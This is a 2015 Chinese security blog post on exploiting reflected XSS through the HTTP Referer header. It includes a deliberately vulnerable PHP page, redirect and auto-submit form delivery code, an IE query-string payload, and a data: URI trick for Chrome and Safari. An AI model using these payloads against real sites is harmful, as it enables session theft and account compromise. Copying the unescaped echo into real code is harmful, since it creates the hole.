<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> refer字段反射xss利用 · xd_xd's blog</title><meta name="description" content="refer字段反射xss利用 - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/jquery.goup.js"></script><script src="/js/goup.js"></script><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/logo.jpg"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/hkalexling" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/archives" target="_self" class="nav-list-link">ARCHIVES</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRIENDS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">refer字段反射xss利用</h1><div class="post-info">Apr 3, 2015</div><div class="post-content"><p>最进遇到一个refer字段的xss。复习一下：</p>
<p>header头referer字段反射xss利用 </p>
<p>##伪造referer </p>
<p>自从flash修复伪造referer之后，目前没有已知的伪造referer的方式。 </p>
<p>##利用跳转 </p>
<p>跳转存在的问题就是在chrome和firefox中，query会被URL编码，IE不会。 </p>
<p>跳转的方式主要有 </p>
<pre><code><span class="keyword">META</span>标签内跳转 
<span class="keyword">javascript</span>跳转 
<span class="keyword"><span class="common">header</span></span>头跳转 
</code></pre><p>测试方式脚本，存在漏洞的页面： </p>
<pre><code>  <span class="php"><span class="preprocessor">&lt;?php</span> 
<span class="keyword">echo</span> <span class="string">'123'</span>; 
<span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>]; 
<span class="preprocessor">?&gt;</span></span> 
</code></pre><p>在本地新建页面，代码如下，firefox中访问<a href="http://127.0.0.1/referer.html?" target="_blank" rel="external">http://127.0.0.1/referer.html?</a><xsscode> </xsscode></p>
  <script> 
  window.location.href='http://192.168.179.128/referer.php' 
  </script> 

<p>页面显示 </p>
<p>  123<a href="http://127.0.0.1/referer.html?%3Cxsscode%3E" target="_blank" rel="external">http://127.0.0.1/referer.html?%3Cxsscode%3E</a> </p>
<p>IE8中测试，发现使用windows.location.href跳转，不会发送referer。(本文中提到的IE都是IE8测试)，这个是IE的问题。可以通过其他的方式带上refer。这是另外一个问题了，这里不做过多讨论了，只提供一种可以利用的方式。参考：<a href="http://www.gremwell.com/exploiting_xss_in_referer_header" target="_blank" rel="external">http://www.gremwell.com/exploiting_xss_in_referer_header</a> </p>
  <html><br>  <body><br>  <form id="xss" name="xss" method="GET" action="http://victim.example.com/vulnerable.php"><br>  </form><br>  <script><br>  document.getElementById(“xss”).submit();<br>  </script><br>  </body><br>  </html> 


<p>也可以使用iframe，因为iframe发出的请求是带referer的 </p>
<p>#使用子域名和路径。 </p>
<p>跳转的时候使用子域名或者路径承载payload，子域名没有测试，测试了下路径，IE8会对路径中的”&lt;”进行url编码。 </p>
<p>##使用datauri </p>
<p>参考：<a href="http://masatokinugawa.l0.cm/2013/10/referrer-xss.html" target="_blank" rel="external">http://masatokinugawa.l0.cm/2013/10/referrer-xss.html</a><br>感谢神秘的M提供的技术翻译。如下： </p>
<p>IE的情况比较简单。因为IE不会对query中的&lt;&gt;进行Encode,所以下面的这种情况在IE是可利用的： </p>
<pre><code>http://l0.cm/xss_referrer.html?<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"1"</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> 
</code></pre><p>但是Firefox.Chrome.Safari和IE却不同。他们会对query中的&lt;&gt;进行Encode,进而导致不能利用。所以我在这里和大家分享一个小的技巧（我自认为，这种手法是别人应该都还没有公开过的） </p>
<pre><code>data:text/html,<span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"referrer"</span> <span class="attribute">content</span>=<span class="value">"always"</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript"><span class="keyword">if</span>(location.protocol!=<span class="string">'data:'</span>){alert(<span class="number">1</span>)}<span class="keyword">else</span>{location.href=<span class="string">"http://vulnerabledoma.in/location/"</span>}</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> 
</code></pre><p>当我们在data:URL中加上</p>
<pre><code>&lt;meta <span class="property">name</span>=<span class="string">"referrer"</span> content=<span class="string">"always"</span>&gt;
</code></pre><p>这个标签时，我们就可以让正常情况下无法发送referrer的data:URL变得可以发送referrer信息了。通过这种方式呢，我们就可以在Chrome和safari下包含一个可以正常执行的“&lt;&gt;”了. </p>
<p>当然，等firefox开始支持</p>
<pre><code>&lt;meta <span class="property">name</span>=<span class="string">"referrer"</span>&gt;
</code></pre><p>了，也许同样的方法也可以应用在firefox上面。 </p>
<p>测试了下，最新版chrome这种方式已经不可以了。根据M的测试结果，目前，safari还是可以的。</p>
</div></article></div></section><footer><div class="paginator"><a href="/2015/04/08/qqmail/" class="prev">上一篇</a><a href="/2015/04/02/yiqicms-xss/" class="next">下一篇</a></div><div class="copyright"><p>© 2015 - 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/hkalexling/Yuno-Apollo" target="_blank">Yuno-Apollo</a>.</p></div></footer></div><script src="https://cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>